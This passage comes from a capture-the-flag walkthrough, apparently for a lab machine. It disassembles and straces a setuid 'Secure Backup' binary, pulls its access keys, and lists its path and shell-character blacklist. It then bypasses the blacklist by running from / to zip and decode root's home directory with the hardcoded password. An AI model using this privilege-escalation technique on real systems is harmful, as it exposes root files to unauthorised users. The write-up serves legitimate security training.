TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA=="
|       |   0x0804912a      e861f5ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x0804912f      83c410         add esp, 0x10
|       |   0x08049132      83ec0c         sub esp, 0xc
|       |   0x08049135      6a00           push 0
|       |   0x08049137      e884f5ffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x08049110 (sym.main)
|       `-> 0x0804913c      837de001       cmp dword [local_20h], 1    ; [0x1:4]=-1 ; 1
|       ,=< 0x08049140      7514           jne 0x8049156
|       |   0x08049142      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
|       |   0x08049145      83c00c         add eax, 0xc
|       |   0x08049148      8b00           mov eax, dword [eax]
|       |   0x0804914a      83ec0c         sub esp, 0xc
|       |   0x0804914d      50             push eax
|       |   0x0804914e      e86bf8ffff     call sym.displayTarget
|       |   0x08049153      83c410         add esp, 0x10
|       |   ; JMP XREF from 0x08049140 (sym.main)
|       `-> 0x08049156      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
|           0x08049159      83c00c         add eax, 0xc
|           0x0804915c      8b00           mov eax, dword [eax]
|           0x0804915e      83ec08         sub esp, 8
|           0x08049161      50             push eax
|           0x08049162      8d8513f9ffff   lea eax, dword [local_6edh]
|           0x08049168      50             push eax
|           0x08049169      e802f5ffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
|           0x0804916e      83c410         add esp, 0x10
|           0x08049171      e80af5ffff     call sym.imp.getpid         ; int getpid(void)
|           0x08049176      89c6           mov esi, eax
|           0x08049178      83ec0c         sub esp, 0xc
|           0x0804917b      6a00           push 0
|           0x0804917d      e8bef4ffff     call sym.imp.time           ; time_t time(time_t *timer)
|           0x08049182      83c410         add esp, 0x10
|           0x08049185      89c3           mov ebx, eax
|           0x08049187      e824f5ffff     call sym.imp.clock          ; clock_t clock(void)
|           0x0804918c      83ec04         sub esp, 4
|           0x0804918f      56             push esi
|           0x08049190      53             push ebx
|           0x08049191      50             push eax
|           0x08049192      e8e4f6ffff     call sym.mix
|           0x08049197      83c410         add esp, 0x10
|           0x0804919a      83ec0c         sub esp, 0xc
|           0x0804919d      50             push eax
|           0x0804919e      e82df5ffff     call sym.imp.srand          ; void srand(int seed)
|           0x080491a3      83c410         add esp, 0x10
|           0x080491a6      e875f5ffff     call sym.imp.rand           ; int rand(void)
|           0x080491ab      8945d4         mov dword [local_2ch], eax
|           0x080491ae      83ec04         sub esp, 4
|           0x080491b1      ff75d4         push dword [local_2ch]
|           0x080491b4      68d59e0408     push str.tmp_.backup__i     ; 0x8049ed5 ; "/tmp/.backup_%i"
|           0x080491b9      8d852bf5ffff   lea eax, dword [local_ad5h]
|           0x080491bf      50             push eax
|           0x080491c0      e88bf5ffff     call sym.imp.sprintf        ; int sprintf(char *s,
|           0x080491c5      83c410         add esp, 0x10
|           0x080491c8      8d8513f9ffff   lea eax, dword [local_6edh]
|           0x080491ce      50             push eax
|           0x080491cf      8d852bf5ffff   lea eax, dword [local_ad5h]
|           0x080491d5      50             push eax
|           0x080491d6      68e89e0408     push str.usr_bin_zip__r__P_magicword__s__s____dev_null ; 0x8049ee8 ; "/usr/bin/zip -r -P magicword %s %s > /dev/null"
|           0x080491db      8d854fefffff   lea eax, dword [local_10b1h]
|           0x080491e1      50             push eax
|           0x080491e2      e869f5ffff     call sym.imp.sprintf        ; int sprintf(char *s,
|           0x080491e7      83c410         add esp, 0x10
|           0x080491ea      83ec0c         sub esp, 0xc
|           0x080491ed      8d854fefffff   lea eax, dword [local_10b1h]
|           0x080491f3      50             push eax
|           0x080491f4      e8a7f4ffff     call sym.imp.system         ; int system(const char *string)
|           0x080491f9      83c410         add esp, 0x10
|           0x080491fc      83ec08         sub esp, 8
|           0x080491ff      6a00           push 0
|           0x08049201      8d852bf5ffff   lea eax, dword [local_ad5h]
|           0x08049207      50             push eax
|           0x08049208      e823f5ffff     call sym.imp.access         ; int access(const char *path, int mode)
|           0x0804920d      83c410         add esp, 0x10
|           0x08049210      83f8ff         cmp eax, 0xff               ; 255
|       ,=< 0x08049213      7448           je 0x804925d
|       |   0x08049215      837de001       cmp dword [local_20h], 1    ; [0x1:4]=-1 ; 1
|      ,==< 0x08049219      7510           jne 0x804922b
|      ||   0x0804921b      83ec0c         sub esp, 0xc
|      ||   0x0804921e      68ac980408     push str.Finished__Encoded_backup_is_below: ; 0x80498ac ; "Finished! Encoded backup is below:\n"
|      ||   0x08049223      e857f7ffff     call sym.displaySuccess
|      ||   0x08049228      83c410         add esp, 0x10
|      `--> 0x0804922b      83ec04         sub esp, 4
|       |   0x0804922e      8d852bf5ffff   lea eax, dword [local_ad5h]
|       |   0x08049234      50             push eax
|       |   0x08049235      68179f0408     push str.usr_bin_base64__w0__s ; 0x8049f17 ; "/usr/bin/base64 -w0 %s"
|       |   0x0804923a      8d854fefffff   lea eax, dword [local_10b1h]
|       |   0x08049240      50             push eax
|       |   0x08049241      e80af5ffff     call sym.imp.sprintf        ; int sprintf(char *s,
|       |   0x08049246      83c410         add esp, 0x10
|       |   0x08049249      83ec0c         sub esp, 0xc
|       |   0x0804924c      8d854fefffff   lea eax, dword [local_10b1h]
|       |   0x08049252      50             push eax
|       |   0x08049253      e848f4ffff     call sym.imp.system         ; int system(const char *string)
|       |   0x08049258      83c410         add esp, 0x10
|      ,==< 0x0804925b      eb16           jmp 0x8049273
|      |`-> 0x0804925d      837de001       cmp dword [local_20h], 1    ; [0x1:4]=-1 ; 1
|      |,=< 0x08049261      7510           jne 0x8049273
|      ||   0x08049263      83ec0c         sub esp, 0xc
|      ||   0x08049266      682e9f0408     push str.The_target_path_doesn_t_exist ; 0x8049f2e ; "The target path doesn't exist"
|      ||   0x0804926b      e8d0f6ffff     call sym.displayWarning
|      ||   0x08049270      83c410         add esp, 0x10
|      ||   ; JMP XREF from 0x0804925b (sym.main)
|      ||   ; JMP XREF from 0x08049261 (sym.main)
|      ``-> 0x08049273      837de001       cmp dword [local_20h], 1    ; [0x1:4]=-1 ; 1
|       ,=< 0x08049277      7510           jne 0x8049289
|       |   0x08049279      83ec0c         sub esp, 0xc
|       |   0x0804927c      6862980408     push 0x8049862
|       |   0x08049281      e80af4ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08049286      83c410         add esp, 0x10
|       |   ; JMP XREF from 0x08049277 (sym.main)
|       `-> 0x08049289      83ec0c         sub esp, 0xc
|           0x0804928c      8d852bf5ffff   lea eax, dword [local_ad5h]
|           0x08049292      50             push eax
|           0x08049293      e8c8f4ffff     call sym.imp.remove         ; int remove(const char *filename)
|           0x08049298      83c410         add esp, 0x10
|           0x0804929b      83ec0c         sub esp, 0xc
|           0x0804929e      ff75d8         push dword [local_28h]
|           0x080492a1      e88af3ffff     call sym.imp.fclose         ; int fclose(FILE *stream)
|           0x080492a6      83c410         add esp, 0x10
|           0x080492a9      b800000000     mov eax, 0
|           0x080492ae      8d65f0         lea esp, dword [local_10h]
|           0x080492b1      59             pop ecx
|           0x080492b2      5b             pop ebx
|           0x080492b3      5e             pop esi
|           0x080492b4      5f             pop edi
|           0x080492b5      5d             pop ebp
|           0x080492b6      8d61fc         lea esp, dword [ecx - 4]
\           0x080492b9      c3             ret
[0x080489fd]>VV
```

![](images/17.png)

![](images/18.png)

![](images/19.png)

![](images/20.png)

```sh
root@kali:~/node# ./backup 1 2 3



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [!] Could not open file


root@kali:~/node#
```

```sh
root@kali:~/node# strace ./backup 1 2 3
execve("./backup", ["./backup", "1", "2", "3"], 0x7ffe1cdeb798 /* 21 vars */) = 0
strace: [ Process PID=7994 runs in 32 bit mode. ]
brk(NULL)                               = 0x9f40000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7ef5000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=146378, ...}) = 0
mmap2(NULL, 146378, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7ed1000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\220\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1926828, ...}) = 0
mmap2(NULL, 1935900, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7cf8000
mprotect(0xf7eca000, 4096, PROT_NONE)   = 0
mmap2(0xf7ecb000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d2000) = 0xf7ecb000
mmap2(0xf7ece000, 10780, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7ece000
close(3)                                = 0
set_thread_area({entry_number=-1, base_addr=0xf7ef60c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
mprotect(0xf7ecb000, 8192, PROT_READ)   = 0
mprotect(0x804b000, 4096, PROT_READ)    = 0
mprotect(0xf7f22000, 4096, PROT_READ)   = 0
munmap(0xf7ed1000, 146378)              = 0
geteuid32()                             = 0
setuid32(0)                             = 0
fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 1), ...}) = 0
brk(NULL)                               = 0x9f40000
brk(0x9f61000)                          = 0x9f61000
brk(0x9f62000)                          = 0x9f62000
write(1, "\n", 1
)                       = 1
write(1, "\n", 1
)                       = 1
write(1, "\n", 1
)                       = 1
write(1, "             ___________________"..., 66             ____________________________________________________
) = 66
write(1, "            /                   "..., 67            /                                                    \
) = 67
write(1, "           |    ________________"..., 68           |    _____________________________________________     |
) = 68
write(1, "           |   |                "..., 68           |   |                                             |    |
) = 68
write(1, "           |   |                "..., 68           |   |                                             |    |
) = 68
write(1, "           |   |                "..., 68           |   |                                             |    |
) = 68
write(1, "           |   |                "..., 68           |   |                                             |    |
) = 68
write(1, "           |   |                "..., 68           |   |                                             |    |
) = 68
write(1, "           |   |                "..., 68           |   |                                             |    |
) = 68
write(1, "           |   |             Sec"..., 68           |   |             Secure Backup v1.0              |    |
) = 68
write(1, "           |   |                "..., 68           |   |                                             |    |
) = 68
write(1, "           |   |                "..., 68           |   |                                             |    |
) = 68
write(1, "           |   |                "..., 68           |   |                                             |    |
) = 68
write(1, "           |   |                "..., 68           |   |                                             |    |
) = 68
write(1, "           |   |                "..., 68           |   |                                             |    |
) = 68
write(1, "           |   |                "..., 68           |   |                                             |    |
) = 68
write(1, "           |   |________________"..., 68           |   |_____________________________________________|    |
) = 68
write(1, "           |                    "..., 68           |                                                      |
) = 68
write(1, "            \\___________________"..., 68            \_____________________________________________________/
) = 68
write(1, "                   \\____________"..., 61                   \_______________________________________/
) = 61
write(1, "                ________________"..., 64                _______________________________________________
) = 64
write(1, "             _-'    .-.-.-.-.-.-"..., 67             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
) = 67
write(1, "          _-'.-.-. .---.-.-.-.-."..., 70          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
) = 70
write(1, "       _-'.-.-.-. .---.-.-.-.-.-"..., 73       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
) = 73
write(1, "    _-'.-.-.-.-. .-----.-.-.-.-."..., 76    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
) = 76
write(1, " _-'.-.-.-.-.-. .---.-. .-------"..., 79 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
) = 79
write(1, ":-------------------------------"..., 80:-----------------------------------------------------------------------------:
) = 80
write(1, "`---._.-------------------------"..., 81`---._.-----------------------------------------------------------------._.---'

) = 81
write(1, "\n", 1
)                       = 1
openat(AT_FDCWD, "/etc/myplace/keys", O_RDONLY) = -1 ENOENT (No such file or directory)
write(1, " \33[33m[!]\33[37m Could not open fi"..., 36 [!] Could not open file

) = 36
write(1, "\n", 1
)                       = 1
exit_group(1)                           = ?
+++ exited with 1 +++
root@kali:~/node#
```

```sh
tom-4.3$ cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110

tom-4.3$
```

```sh
root@kali:~/node# vim /etc/myplace/keys
root@kali:~/node#
root@kali:~/node#
root@kali:~/node# mkdir -p /etc/myplace
root@kali:~/node# vim /etc/myplace/keys
root@kali:~/node# cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110

root@kali:~/node#
```

```sh
tom-4.3$ vi /var/www/myplace/app.js
```

![](images/21.png)

```sh
root@kali:~/node# ./backup -p 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /etc/myplace/keys



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [+] Validated access token
 [+] Finished! Encoded backup is below:

UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
root@kali:~/node#
```

![](images/22.png)

![](images/23.png)

![](images/24.png)

![](images/25.png)

![](images/26.png)

![](images/27.png)

![](images/28.png)

![](images/29.png)

![](images/30.png)

![](images/31.png)

![](images/32.png)

- Blacklist

```
..
/root
;
&
`
$
|
/etc
//
/
/etc
```

###### Method 1 - Abusing CWD

```sh
tom-4.3$ cd /
tom-4.3$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root
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
tom-4.3$
```

```sh
root@kali:~/node# nano root-dir.b64
root@kali:~/node# base64 -d root-dir.b64 > root-dir.zip
root@kali:~/node# unzip root-dir.zip
Archive:  root-dir.zip
   creating: root/
[root-dir.zip] root/.profile password:
  inflating: root/.profile
  inflating: root/.bash_history
   creating: root/.cache/
 extracting: root/.cache/motd.legal-displayed
 extracting: root/root.txt
  inflating: root/.bashrc
